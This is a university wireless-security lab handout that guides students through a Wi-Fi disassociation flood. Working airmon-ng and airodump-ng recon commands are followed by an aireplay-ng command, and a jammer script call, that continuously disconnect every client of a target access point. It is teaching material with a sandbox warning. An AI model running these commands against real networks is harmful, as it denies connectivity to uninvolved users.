
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Disassociation Flood Attack  
**Author:** Dr Ayman El Hajjar  

---

#  Lab Activity: Disassociation Flood Attack

---

###  Objective

In this lab, you will simulate a disassociation flood attack — a type of denial-of-service attack that floods a Wi-Fi AP with disassociation frames. This forces clients to disconnect and can prevent them from maintaining stable connectivity.

---

###  Warning

This is a disruptive wireless attack and must only be used in a sandboxed lab environment.

---

##  Step 1: Identify Target Access Point

Use `airodump-ng` to find the BSSID and channel of your target network:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

---

## Step 2: Launch the Disassociation Attack

Use the provided script:

```bash
sudo ./disassoc_jammer.sh wlan0mon <BSSID>

```

Or run manually:

```bash
sudo aireplay-ng --disassoc 0 -a <BSSID> wlan0mon
```

> This sends a continuous stream of disassoc frames to all clients of the AP.

---

##
 Step 3: Observe Client Impact

On the victim side:
- Check for sudden disconnections
- Reconnection attempts may fail
- Time-sensitive apps (VoIP, games) are interrupted

---

##
 Discussion Points

- How is this attack different from deauthentication?
- Can clients distinguish a real disassoc message from a fake one?
- Are modern systems resistant to this attack?

---

##
 Cleanup

```bash
sudo pkill aireplay-ng
sudo airmon-ng stop wlan0mon
```

---

##  Optional Screenshots

Save in `tasks/img/`:
- `airodump-ng` view of connected clients
- Aireplay-ng disassoc output
- Client system log (if visible)

---

## Summary


| Phase     | Tool               | Purpose                                |
|-----------|--------------------|----------------------------------------|
| Recon     | `airodump-ng`      | Discover target AP                     |
| Attack    | `aireplay-ng`      | Send disassociation frames             |
| Monitor   | Client behaviour   | Observe disconnects and disruptions    |

---
